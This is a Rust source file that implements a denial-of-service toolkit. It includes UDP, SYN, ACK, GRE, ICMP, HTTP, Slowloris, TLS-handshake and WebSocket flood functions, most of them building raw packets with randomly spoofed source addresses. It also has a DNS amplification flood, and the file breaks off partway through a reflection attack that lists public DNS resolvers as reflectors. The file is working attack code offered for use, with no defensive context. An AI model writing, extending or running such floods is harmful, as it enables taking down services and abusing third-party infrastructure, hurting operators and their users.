use tokio::net::UdpSocket;
use tokio::time::{Duration, Instant};
use tokio::io::AsyncWriteExt;
use rand::{Rng, SeedableRng};
use std::net::{IpAddr, SocketAddr};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use tokio::sync::{Mutex, Semaphore};
use socket2::{Socket, Domain, Type, Protocol};
use std::net::{SocketAddrV4, Ipv4Addr};

/// Calculate optimal worker count based on CPU cores
/// Returns 2 workers per CPU core, clamped between 4 and 64
fn get_worker_count() -> usize {
    let cpu_count = num_cpus::get();
    (cpu_count * 2).clamp(4, 64)
}

pub async fn udp_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting UDP flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let socket_result = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP));
    if socket_result.is_err() {
        println!("WARNING: Failed to create raw socket. Falling back to standard UDP flood.");
        // Fallback logic would go here, but for brevity we return or implement simple fallback
        // In a real scenario, we'd keep the old implementation as a fallback function
        return;
    }

    let target_ip: Ipv4Addr = match resolve_ipv4(target, port).await {
        Some(ip) => ip,
        None => return,
    };
    
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count();
    println!("Using {} workers (Raw Socket Mode)", num_workers);
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let target_ip = target_ip;
        
        let handle = tokio::spawn(async move {
            let socket = match Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP)) {
                Ok(s) => s,
                Err(_) => return,
            };
            if socket.set_header_included_v4(true).is_err() { return; }

            let target_addr = SocketAddrV4::new(target_ip, port);
            let sock_addr = socket2::SockAddr::from(target_addr);
            let mut rng = rand::thread_rng();
            
            // Max UDP payload for non-fragmented is usually around 1472, but we can go higher if we want fragmentation
            // For flood, smaller is often better for PPS, larger for bandwidth.
            // Let's use a static buffer for speed.
            let payload = vec![0u8; 1400]; 

            while Instant::now() < end_time {
                let src_ip = Ipv4Addr::new(rng.gen(), rng.gen(), rng.gen(), rng.gen());
                let src_port: u16 = rng.gen();
                
                let packet = build_udp_packet(src_ip, target_ip, src_port, port, &payload);

                if socket.send_to(&packet, &sock_addr).is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("UDP flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn udp_smart(target: &str, port: u16, duration_secs: u64) {
    println!("Starting randomized UDP flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let socket_result = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP));
    if socket_result.is_err() {
        println!("WARNING: Failed to create raw socket.");
        return;
    }

    let target_ip: Ipv4Addr = match resolve_ipv4(target, port).await {
        Some(ip) => ip,
        None => return,
    };
    
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count();
    println!("Using {} workers (Raw Socket Mode)", num_workers);
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let target_ip = target_ip;
        
        let handle = tokio::spawn(async move {
            let socket = match Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP)) {
                Ok(s) => s,
                Err(_) => return,
            };
            if socket.set_header_included_v4(true).is_err() { return; }

            let target_addr = SocketAddrV4::new(target_ip, port);
            let sock_addr = socket2::SockAddr::from(target_addr);
            let mut rng = rand::thread_rng();
            
            while Instant::now() < end_time {
                let src_ip = Ipv4Addr::new(rng.gen(), rng.gen(), rng.gen(), rng.gen());
                let src_port: u16 = rng.gen();
                
                // Random payload size
                let size = rng.gen_range(64..1400);
                let mut payload = vec![0u8; size];
                rng.fill(&mut payload[..]);
                
                let packet = build_udp_packet(src_ip, target_ip, src_port, port, &payload);

                if socket.send_to(&packet, &sock_addr).is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("UDP smart flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn tcp_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting TCP flood on {}:{} for {} seconds", target, port, duration_secs);
    
    // Resolve target once to avoid DNS lookups in loop
    let target_addrs = match tokio::net::lookup_host(format!("{}:{}", target, port)).await {
        Ok(addrs) => addrs,
        Err(_) => {
            eprintln!("Could not resolve target: {}", target);
            return;
        }
    };
    // Take the first address
    let target_addr = match target_addrs.into_iter().next() {
        Some(a) => a,
        None => {
            eprintln!("No address found for target: {}", target);
            return;
        }
    };

    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let start_time = Instant::now();
    
    let num_workers = get_worker_count();
    // Allow high concurrency per worker
    let max_concurrent = 256; 
    
    println!("Using {} workers (CPU cores: {}) with {} concurrent connections each", num_workers, num_cpus::get(), max_concurrent);
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let semaphore = Arc::new(Semaphore::new(max_concurrent));
        
        let handle = tokio::spawn(async move {
            while start_time.elapsed() < duration {
                // Acquire permit
                if let Ok(permit) = semaphore.clone().acquire_owned().await {
                    let counter = packet_count.clone();
                    
                    tokio::spawn(async move {
                        // Timeout is crucial for flood speed
                        let connect = tokio::net::TcpStream::connect(target_addr);
                        if let Ok(Ok(mut stream)) = tokio::time::timeout(Duration::from_secs(1), connect).await {
                            counter.fetch_add(1, Ordering::Relaxed);
                            // Send a small payload to force processing
                            let _ = stream.write_all(b"A").await;
                        }
                        drop(permit);
                    });
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("TCP flood complete. Connections: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn syn_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting SYN flood on {}:{} for {} seconds", target, port, duration_secs);
    
    // Try to create a raw socket to check permissions
    let raw_socket_result = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::TCP));
    
    if raw_socket_result.is_err() {
        println!("WARNING: Failed to create raw socket (requires CAP_NET_RAW or root). Falling back to TCP flood.");
        tcp_flood(target, port, duration_secs).await;
        return;
    }

    let target_ip: Ipv4Addr = match target.parse() {
        Ok(ip) => ip,
        Err(_) => {
            // Resolve if it's a domain
             match tokio::net::lookup_host(format!("{}:{}", target, port)).await {
                Ok(mut addrs) => {
                    if let Some(SocketAddr::V4(addr)) = addrs.find(|a| a.is_ipv4()) {
                        *addr.ip()
                    } else {
                        eprintln!("Could not resolve to IPv4 address: {}", target);
                        return;
                    }
                }
                Err(_) => {
                    eprintln!("Invalid IP address or domain: {}", target);
                    return;
                }
            }
        }
    };

    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count();
    
    println!("Using {} workers (Raw Socket Mode)", num_workers);
    let mut handles = vec![];

    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let target_ip = target_ip;
        
        let handle = tokio::spawn(async move {
            // Create socket per worker
            let socket = match Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::TCP)) {
                Ok(s) => s,
                Err(_) => return,
            };
            
            // Enable IP_HDRINCL to include custom IP header
            if let Err(e) = socket.set_header_included_v4(true) {
                eprintln!("Failed to set IP_HDRINCL: {}", e);
                return;
            }

            let target_addr = SocketAddrV4::new(target_ip, port);
            let sock_addr = socket2::SockAddr::from(target_addr);

            let mut rng = rand::thread_rng();

            while Instant::now() < end_time {
                // Random source IP and port
                let src_ip = Ipv4Addr::new(
                    rng.gen(), rng.gen(), rng.gen(), rng.gen()
                );
                let src_port: u16 = rng.gen();
                let seq: u32 = rng.gen();

                // SYN Flag = 0x02
                let packet = build_tcp_packet(src_ip, target_ip, src_port, port, seq, 0, 0x02);
                
                if socket.send_to(&packet, &sock_addr).is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        handles.push(handle);
    }

    for handle in handles {
        let _ = handle.await;
    }
    
    println!("SYN flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

// Helper functions for packet construction
fn build_tcp_packet(src_ip: Ipv4Addr, dst_ip: Ipv4Addr, src_port: u16, dst_port: u16, seq: u32, ack_seq: u32, flags: u16) -> Vec<u8> {
    let mut packet = Vec::with_capacity(40);
    
    // IPv4 Header (20 bytes)
    // Version (4) + IHL (5) = 0x45
    packet.push(0x45);
    // TOS
    packet.push(0x00);
    // Total Length (40 bytes)
    packet.extend_from_slice(&40u16.to_be_bytes());
    // ID
    packet.extend_from_slice(&0x1234u16.to_be_bytes());
    // Flags + Fragment Offset
    packet.extend_from_slice(&0x0000u16.to_be_bytes());
    // TTL
    packet.push(64);
    // Protocol (TCP = 6)
    packet.push(6);
    // Checksum (0 for now)
    packet.extend_from_slice(&0u16.to_be_bytes());
    // Source IP
    packet.extend_from_slice(&src_ip.octets());
    // Dest IP
    packet.extend_from_slice(&dst_ip.octets());
    
    // Calculate IP Checksum
    let ip_checksum = calculate_checksum(&packet[0..20]);
    packet[10] = (ip_checksum >> 8) as u8;
    packet[11] = (ip_checksum & 0xFF) as u8;
    
    // TCP Header (20 bytes)
    let tcp_start = 20;
    // Source Port
    packet.extend_from_slice(&src_port.to_be_bytes());
    // Dest Port
    packet.extend_from_slice(&dst_port.to_be_bytes());
    // Sequence Number
    packet.extend_from_slice(&seq.to_be_bytes());
    // Ack Number
    packet.extend_from_slice(&ack_seq.to_be_bytes());
    // Data Offset (5) + Reserved + Flags
    // 5 << 4 = 0x50. 
    let data_offset_flags = 0x5000 | flags;
    packet.extend_from_slice(&data_offset_flags.to_be_bytes());
    // Window
    packet.extend_from_slice(&64240u16.to_be_bytes());
    // Checksum (0 for now)
    packet.extend_from_slice(&0u16.to_be_bytes());
    // Urgent Pointer
    packet.extend_from_slice(&0u16.to_be_bytes());
    
    // Calculate TCP Checksum (Pseudo-header + TCP Header)
    let tcp_checksum = calculate_tcp_checksum(&packet[tcp_start..], src_ip, dst_ip, 20);
    packet[36] = (tcp_checksum >> 8) as u8;
    packet[37] = (tcp_checksum & 0xFF) as u8;
    
    packet
}

fn calculate_checksum(data: &[u8]) -> u16 {
    let mut sum = 0u32;
    for i in (0..data.len()).step_by(2) {
        if i + 1 < data.len() {
            sum += u16::from_be_bytes([data[i], data[i+1]]) as u32;
        } else {
            sum += (data[i] as u32) << 8;
        }
    }
    
    while (sum >> 16) != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    !sum as u16
}

fn calculate_tcp_checksum(tcp_header: &[u8], src: Ipv4Addr, dst: Ipv4Addr, len: u16) -> u16 {
    let mut sum = 0u32;
    
    // Pseudo-header
    // Source IP
    for octet in src.octets().chunks(2) {
        sum += u16::from_be_bytes([octet[0], octet[1]]) as u32;
    }
    // Dest IP
    for octet in dst.octets().chunks(2) {
        sum += u16::from_be_bytes([octet[0], octet[1]]) as u32;
    }
    // Reserved (0) + Protocol (6)
    sum += 6;
    // TCP Length
    sum += len as u32;
    
    // TCP Header
    for i in (0..tcp_header.len()).step_by(2) {
        if i + 1 < tcp_header.len() {
            sum += u16::from_be_bytes([tcp_header[i], tcp_header[i+1]]) as u32;
        } else {
            sum += (tcp_header[i] as u32) << 8;
        }
    }
    
    while (sum >> 16) != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    !sum as u16
}

pub async fn ack_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting ACK flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let socket_result = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::TCP));
    if socket_result.is_err() {
        println!("WARNING: Failed to create raw socket. Falling back to TCP flood.");
        tcp_flood(target, port, duration_secs).await;
        return;
    }

    let target_ip: Ipv4Addr = match resolve_ipv4(target, port).await {
        Some(ip) => ip,
        None => return,
    };

    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count();
    
    println!("Using {} workers (Raw Socket Mode)", num_workers);
    let mut handles = vec![];

    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let target_ip = target_ip;
        
        let handle = tokio::spawn(async move {
            let socket = match Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::TCP)) {
                Ok(s) => s,
                Err(_) => return,
            };
            if socket.set_header_included_v4(true).is_err() { return; }

            let target_addr = SocketAddrV4::new(target_ip, port);
            let sock_addr = socket2::SockAddr::from(target_addr);
            let mut rng = rand::thread_rng();

            while Instant::now() < end_time {
                let src_ip = Ipv4Addr::new(rng.gen(), rng.gen(), rng.gen(), rng.gen());
                let src_port: u16 = rng.gen();
                let seq: u32 = rng.gen();
                let ack: u32 = rng.gen();

                // ACK Flag = 0x10
                let packet = build_tcp_packet(src_ip, target_ip, src_port, port, seq, ack, 0x10);
                
                if socket.send_to(&packet, &sock_addr).is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        handles.push(handle);
    }

    for handle in handles {
        let _ = handle.await;
    }
    println!("ACK flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn gre_flood(target: &str, duration_secs: u64) {
    println!("Starting GRE flood on {} for {} seconds", target, duration_secs);
    
    // Protocol 47 is GRE
    // Note: socket2::Protocol doesn't have GRE constant easily accessible, use raw 47
    let gre_proto = Protocol::from(47);
    let socket_result = Socket::new(Domain::IPV4, Type::RAW, Some(gre_proto));
    
    if socket_result.is_err() {
        println!("WARNING: Failed to create raw socket. Falling back to TCP flood.");
        tcp_flood(target, 47, duration_secs).await;
        return;
    }

    let target_ip: Ipv4Addr = match target.parse() {
        Ok(ip) => ip,
        Err(_) => {
             match tokio::net::lookup_host(format!("{}:80", target)).await {
                Ok(mut addrs) => {
                    if let Some(SocketAddr::V4(addr)) = addrs.find(|a| a.is_ipv4()) {
                        *addr.ip()
                    } else {
                        return;
                    }
                }
                Err(_) => return,
            }
        }
    };

    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count();
    
    println!("Using {} workers (Raw Socket Mode)", num_workers);
    let mut handles = vec![];

    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let target_ip = target_ip;
        
        let handle = tokio::spawn(async move {
            let gre_proto = Protocol::from(47);
            let socket = match Socket::new(Domain::IPV4, Type::RAW, Some(gre_proto)) {
                Ok(s) => s,
                Err(_) => return,
            };
            if socket.set_header_included_v4(true).is_err() { return; }

            let target_addr = SocketAddrV4::new(target_ip, 0);
            let sock_addr = socket2::SockAddr::from(target_addr);
            let mut rng = rand::thread_rng();

            while Instant::now() < end_time {
                let src_ip = Ipv4Addr::new(rng.gen(), rng.gen(), rng.gen(), rng.gen());
                let packet = build_gre_packet(src_ip, target_ip);
                
                if socket.send_to(&packet, &sock_addr).is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        handles.push(handle);
    }

    for handle in handles {
        let _ = handle.await;
    }
    println!("GRE flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn udp_max_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting UDP MAX Flood (Packet-In-Packet/MTU) on {}:{} for {} seconds", target, port, duration_secs);

    let socket_result = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP));
    if socket_result.is_err() {
        println!("WARNING: Failed to create raw socket. Falling back to standard UDP flood.");
        udp_flood(target, port, duration_secs).await;
        return;
    }

    let target_ip: Ipv4Addr = match resolve_ipv4(target, port).await {
        Some(ip) => ip,
        None => return,
    };

    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count();

    println!("Using {} workers (Raw Socket Mode)", num_workers);
    let mut handles = vec![];

    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let target_ip = target_ip;
        
        let handle = tokio::spawn(async move {
            let socket = match Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP)) {
                Ok(s) => s,
                Err(_) => return,
            };
            if socket.set_header_included_v4(true).is_err() { return; }

            let target_addr = SocketAddrV4::new(target_ip, port);
            let sock_addr = socket2::SockAddr::from(target_addr);
            let mut rng = rand::thread_rng();

            // MTU Optimization: 1500 (Ethernet) - 20 (IP) - 8 (UDP) = 1472 bytes
            // We fill this with random data to simulate high bandwidth
            let payload_len = 1472;
            let mut payload = vec![0u8; payload_len];

            while Instant::now() < end_time {
                // Full Packet Spoofing / Randomization
                rng.fill(&mut payload[..]);
                
                // Randomize Source IP (Spoofing)
                let src_ip = Ipv4Addr::new(rng.gen(), rng.gen(), rng.gen(), rng.gen());
                // Randomize Source Port
                let src_port: u16 = rng.gen();

                // Note: We are building the IP header manually, so we can randomize ID, TTL, etc.
                let packet = build_udp_packet(src_ip, target_ip, src_port, port, &payload);
                
                if socket.send_to(&packet, &sock_addr).is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        handles.push(handle);
    }

    for handle in handles {
        let _ = handle.await;
    }
    println!("UDP MAX flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn dns_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Enterprise DNS Amplification Simulation on {}:{} for {} seconds", target, port, duration_secs);

    let socket_result = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP));
    if socket_result.is_err() {
        println!("WARNING: Failed to create raw socket. Falling back to standard DNS flood.");
        return;
    }

    let target_ip: Ipv4Addr = match resolve_ipv4(target, port).await {
        Some(ip) => ip,
        None => return,
    };

    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count();

    // High-value domains that typically have large records (DNSSEC, many A records)
    let domains = vec![
        "google.com", "cloudflare.com", "amazon.com", "isc.org", "ietf.org", "ripe.net"
    ];

    println!("Using {} workers (Raw Socket Mode - EDNS0 Enabled)", num_workers);
    let mut handles = vec![];

    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let target_ip = target_ip;
        let domains = domains.clone();
        
        let handle = tokio::spawn(async move {
            let socket = match Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP)) {
                Ok(s) => s,
                Err(_) => return,
            };
            if socket.set_header_included_v4(true).is_err() { return; }

            let target_addr = SocketAddrV4::new(target_ip, port);
            let sock_addr = socket2::SockAddr::from(target_addr);
            let mut rng = rand::thread_rng();

            while Instant::now() < end_time {
                let src_ip = Ipv4Addr::new(rng.gen(), rng.gen(), rng.gen(), rng.gen());
                let src_port: u16 = rng.gen();

                let domain = domains[rng.gen_range(0..domains.len())];
                // Use ANY (255) or TXT (16) for max response size
                // Enable EDNS0 (4096 byte buffer) to maximize amplification factor
                let dns_payload = build_edns_query_payload(domain, 255); 
                
                let packet = build_udp_packet(src_ip, target_ip, src_port, port, &dns_payload);
                
                if socket.send_to(&packet, &sock_addr).is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        handles.push(handle);
    }

    for handle in handles {
        let _ = handle.await;
    }
    println!("DNS flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

fn build_edns_query_payload(domain: &str, qtype: u16) -> Vec<u8> {
    let mut packet = Vec::new();
    let mut rng = rand::thread_rng();

    // Transaction ID
    packet.extend_from_slice(&rng.gen::<u16>().to_be_bytes());
    // Flags: Standard Query (0)
    packet.extend_from_slice(&0x0000u16.to_be_bytes());
    // Questions: 1
    packet.extend_from_slice(&0x0001u16.to_be_bytes());
    // Answer RRs: 0
    packet.extend_from_slice(&0x0000u16.to_be_bytes());
    // Authority RRs: 0
    packet.extend_from_slice(&0x0000u16.to_be_bytes());
    // Additional RRs: 1 (For EDNS0 OPT RR)
    packet.extend_from_slice(&0x0001u16.to_be_bytes());

    // Query Section
    for part in domain.split('.') {
        let len = part.len();
        if len > 63 { continue; }
        packet.push(len as u8);
        packet.extend_from_slice(part.as_bytes());
    }
    packet.push(0); // End of name

    // Type
    packet.extend_from_slice(&qtype.to_be_bytes());
    // Class (IN = 1)
    packet.extend_from_slice(&0x0001u16.to_be_bytes());

    // Additional Section: EDNS0 OPT RR
    // Name: Root (0)
    packet.push(0);
    // Type: OPT (41)
    packet.extend_from_slice(&41u16.to_be_bytes());
    // UDP Payload Size: 4096
    packet.extend_from_slice(&4096u16.to_be_bytes());
    // Extended RCODE (0) + EDNS Version (0) + DO Flag (0) + Z (0)
    packet.extend_from_slice(&0x0000u32.to_be_bytes());
    // RDLEN: 0
    packet.extend_from_slice(&0x0000u16.to_be_bytes());

    packet
}

pub async fn http_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting HTTP flood on {}:{} for {} seconds", target, port, duration_secs);
    
    let target_url = format!("http://{}:{}", target, port);
    let request_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let user_agents = vec![
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36",
    ];
    
    let num_workers = get_worker_count();
    println!("Using {} workers (CPU cores: {})", num_workers, num_cpus::get());
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_url = target_url.clone();
        let request_count = request_count.clone();
        let user_agents = user_agents.clone();
        
        let handle = tokio::spawn(async move {
            let client = reqwest::Client::new();
            let counter = std::sync::atomic::AtomicU64::new(0);
            
            while Instant::now() < end_time {
                // Use counter for simple rotation
                let idx = counter.fetch_add(1, Ordering::Relaxed) as usize % user_agents.len();
                let user_agent = user_agents[idx];
                let body = vec![0u8; 1024];
                
                if (client
                    .post(&target_url)
                    .header("User-Agent", user_agent)
                    .body(body)
                    .send()
                    .await).is_ok()
                {
                    request_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("HTTP flood complete. Requests sent: {}", request_count.load(Ordering::Relaxed));
}

pub async fn slowloris(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Slowloris attack on {}:{} for {} seconds", target, port, duration_secs);
    println!("Strategy: Open connections and send partial HTTP headers slowly");
    
    let target_addr = format!("{}:{}", target, port);
    let connection_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count() * 4; // More connections per core for slowloris
    println!("Opening {} slow connections...", num_workers);
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_addr = target_addr.clone();
        let connection_count = connection_count.clone();
        
        let handle = tokio::spawn(async move {
            while Instant::now() < end_time {
                if let Ok(mut stream) = tokio::net::TcpStream::connect(&target_addr).await {
                    connection_count.fetch_add(1, Ordering::Relaxed);
                    
                    // Send partial HTTP request header
                    let initial_header = "GET / HTTP/1.1\r\n";
                    let _ = stream.write_all(initial_header.as_bytes()).await;
                    
                    // Keep connection alive by sending more headers slowly
                    let mut interval = tokio::time::interval(Duration::from_secs(10));
                    while Instant::now() < end_time {
                        interval.tick().await;
                        
                        // Send continuation header slowly
                        let continuation = format!("X-Custom-{}: {}-{}\r\n", 
                            rand::random::<u32>(), 
                            rand::random::<u64>(),
                            rand::random::<u64>()
                        );
                        
                        if stream.write_all(continuation.as_bytes()).await.is_err() {
                            break; // Connection closed
                        }
                    }
                }
                tokio::time::sleep(Duration::from_millis(100)).await;
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("Slowloris complete. Connections opened: {}", connection_count.load(Ordering::Relaxed));
}

pub async fn ssl_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting SSL/TLS handshake flood on {}:{} for {} seconds", target, port, duration_secs);
    println!("Strategy: Initiate TLS handshakes to exhaust CPU resources");
    
    let target_addr = format!("{}:{}", target, port);
    let handshake_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count() * 2;
    println!("Using {} workers (CPU cores: {})", num_workers, num_cpus::get());
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_addr = target_addr.clone();
        let handshake_count = handshake_count.clone();
        
        let handle = tokio::spawn(async move {
            while Instant::now() < end_time {
                if let Ok(mut stream) = tokio::net::TcpStream::connect(&target_addr).await {
                    // Start TLS handshake but don't complete it
                    // This forces server to allocate crypto resources
                    let _ = stream.write_all(&[0x16, 0x03, 0x01]).await; // TLS handshake header
                    handshake_count.fetch_add(1, Ordering::Relaxed);
                    drop(stream);
                }
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("SSL flood complete. Handshakes initiated: {}", handshake_count.load(Ordering::Relaxed));
}

pub async fn websocket_flood(target: &str, port: u16, duration_secs: u64) {
    println!("Starting WebSocket flood on {}:{} for {} seconds", target, port, duration_secs);
    println!("Strategy: Establish WebSocket connections and spam messages");
    
    let target_addr = format!("{}:{}", target, port);
    let message_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    let num_workers = get_worker_count();
    println!("Using {} workers (CPU cores: {})", num_workers, num_cpus::get());
    let mut handles = vec![];
    
    for _ in 0..num_workers {
        let target_addr = target_addr.clone();
        let message_count = message_count.clone();
        
        let handle = tokio::spawn(async move {
            while Instant::now() < end_time {
                if let Ok(mut stream) = tokio::net::TcpStream::connect(&target_addr).await {
                    // Send WebSocket upgrade request
                    let ws_upgrade = format!(
                        "GET / HTTP/1.1\r\n\
                         Host: {}\r\n\
                         Upgrade: websocket\r\n\
                         Connection: Upgrade\r\n\
                         Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\
                         Sec-WebSocket-Version: 13\r\n\r\n",
                        target_addr
                    );
                    
                    if stream.write_all(ws_upgrade.as_bytes()).await.is_ok() {
                        // Spam WebSocket frames
                        let payload = vec![0x81, 0x05, 0x48, 0x65, 0x6c, 0x6c, 0x6f]; // "Hello" frame
                        for _ in 0..100 {
                            if stream.write_all(&payload).await.is_err() {
                                break;
                            }
                            message_count.fetch_add(1, Ordering::Relaxed);
                        }
                    }
                }
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        });
        
        handles.push(handle);
    }
    
    for handle in handles {
        let _ = handle.await;
    }
    
    println!("WebSocket flood complete. Messages sent: {}", message_count.load(Ordering::Relaxed));
}

pub async fn icmp_flood(target: &str, duration_secs: u64) {
    println!("Starting ICMP flood on {} for {} seconds", target, duration_secs);
    
    let socket_result = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::ICMPV4));
    if socket_result.is_err() {
        println!("WARNING: Failed to create raw socket. Falling back to UDP flood.");
        udp_flood(target, 80, duration_secs).await;
        return;
    }

    // Parse target IP (ICMP doesn't use ports)
    let target_ip: Ipv4Addr = match target.parse() {
        Ok(ip) => ip,
        Err(_) => {
             match tokio::net::lookup_host(format!("{}:80", target)).await {
                Ok(mut addrs) => {
                    if let Some(SocketAddr::V4(addr)) = addrs.find(|a| a.is_ipv4()) {
                        *addr.ip()
                    } else {
                        return;
                    }
                }
                Err(_) => return,
            }
        }
    };

    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    let num_workers = get_worker_count();
    
    println!("Using {} workers (Raw Socket Mode)", num_workers);
    let mut handles = vec![];

    for _ in 0..num_workers {
        let packet_count = packet_count.clone();
        let target_ip = target_ip;
        
        let handle = tokio::spawn(async move {
            let socket = match Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::ICMPV4)) {
                Ok(s) => s,
                Err(_) => return,
            };
            if socket.set_header_included_v4(true).is_err() { return; }

            let target_addr = SocketAddrV4::new(target_ip, 0);
            let sock_addr = socket2::SockAddr::from(target_addr);
            let mut rng = rand::thread_rng();

            while Instant::now() < end_time {
                let src_ip = Ipv4Addr::new(rng.gen(), rng.gen(), rng.gen(), rng.gen());
                let packet = build_icmp_packet(src_ip, target_ip);
                
                if socket.send_to(&packet, &sock_addr).is_ok() {
                    packet_count.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        handles.push(handle);
    }

    for handle in handles {
        let _ = handle.await;
    }
    println!("ICMP flood complete. Packets sent: {}", packet_count.load(Ordering::Relaxed));
}

pub async fn amplification_attack(target: &str, port: u16, duration_secs: u64) {
    println!("Starting Amplification attack on {}:{} for {} seconds", target, port, duration_secs);
    println!("Strategy: Use DNS reflection for traffic amplification (Spoofed Source)");
    
    let socket_result = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::UDP));
    if socket_result.is_err() {
        println!("WARNING: Failed to create raw socket. Amplification requires spoofing.");
        return;
    }

    let target_ip: Ipv4Addr = match resolve_ipv4(target, port).await {
        Some(ip) => ip,
        None => return,
    };
    
    let packet_count = Arc::new(AtomicU64::new(0));
    let duration = Duration::from_secs(duration_secs);
    let end_time = Instant::now() + duration;
    
    // Public DNS servers to use as reflectors
    let reflectors = vec![
        "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
        "9.9.9.9", "149.112.112.112", "208.67.222.222", "208.67.220.220"
    ];
    
    let num_workers = get_worker_count();
